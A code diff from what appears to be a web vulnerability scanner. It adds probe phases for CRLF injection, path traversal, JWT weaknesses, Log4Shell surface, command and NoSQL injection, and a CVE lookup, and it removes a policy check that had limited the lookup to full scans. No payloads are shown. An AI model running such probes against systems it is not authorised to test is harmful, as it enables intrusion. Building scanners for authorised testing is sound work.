-    await onLog(`[${ts()}] [Phase 13] Advanced vulnerability probes — SSTI · XXE · SSRF · Deserialization...`);
-    const [sstiF, xxeF, ssrfF, deserF] = await Promise.all([
+  // ── Phase 15: CRLF injection ──────────────────────────────────────────────
+  await onLog(`[${ts()}] [Phase 15] CRLF injection / HTTP response splitting...`);
+  add(await checkCrlfInjection(target, onLog));
+
+  // ── Phase 16: Path traversal ──────────────────────────────────────────────
+  await onLog(`[${ts()}] [Phase 16] Path traversal / directory traversal...`);
+  add(await checkPathTraversal(target, onLog));
+
+  // ── Phase 17: JWT weakness detection ─────────────────────────────────────
+  await onLog(`[${ts()}] [Phase 17] JWT algorithm and secret weakness detection...`);
+  add(await checkJwtWeaknesses(target, onLog));
+
+  // ── Phase 18: Log4Shell / Spring4Shell surface ────────────────────────────
+  await onLog(`[${ts()}] [Phase 18] Log4Shell (CVE-2021-44228) / Spring4Shell (CVE-2022-22965) surface...`);
+  add(await checkLog4ShellSurface(target, onLog));
+
+  // ── Phase 19: Rate limiting on auth endpoints ─────────────────────────────
+  await onLog(`[${ts()}] [Phase 19] Rate limiting / brute-force protection check...`);
+  add(await checkRateLimiting(target, onLog));
+
+  // ── Phase 20: Advanced vulnerability probes ───────────────────────────────
+  {
+    const { checkSSTI, checkXXE, checkSSRF, checkDeserialization, checkCommandInjection, checkNoSqlInjection, lookupCvesForTechs } = await import("./vuln-probes");
+    await onLog(`[${ts()}] [Phase 20] Advanced probes — SSTI · XXE · SSRF · Deserialization · CMDi · NoSQL...`);
+    const [sstiF, xxeF, ssrfF, deserF, cmdF, nosqlF] = await Promise.all([
       checkSSTI(target, onLog),
       checkXXE(target, onLog),
       checkSSRF(target, onLog),
       checkDeserialization(target, onLog),
+      checkCommandInjection(target, onLog),
+      checkNoSqlInjection(target, onLog),
     ]);
-    add(sstiF); add(xxeF); add(ssrfF); add(deserF);
+    add(sstiF); add(xxeF); add(ssrfF); add(deserF); add(cmdF); add(nosqlF);
 
-    // CVE lookup for detected technologies (full scan only — NVD rate limits)
-    if (scanType === "full" && policy.allowDeepChecks) {
-      await onLog(`[${ts()}] [Phase 14] CVE database lookup for detected technologies...`);
-      const { techs: detectedTechs } = await fingerprint(target, async () => {});
-      add(await lookupCvesForTechs(detectedTechs, onLog));
-    }
+    // CVE lookup for detected technologies
+    await onLog(`[${ts()}] [Phase 21] CVE database lookup (NVD) for detected technology versions...`);
+    const { techs: detectedTechs } = await fingerprint(target, async () => {});
+    add(await lookupCvesForTechs(detectedTechs, onLog));
   }
 
   // ── Summary ───────────────────────────────────────────────────────────────
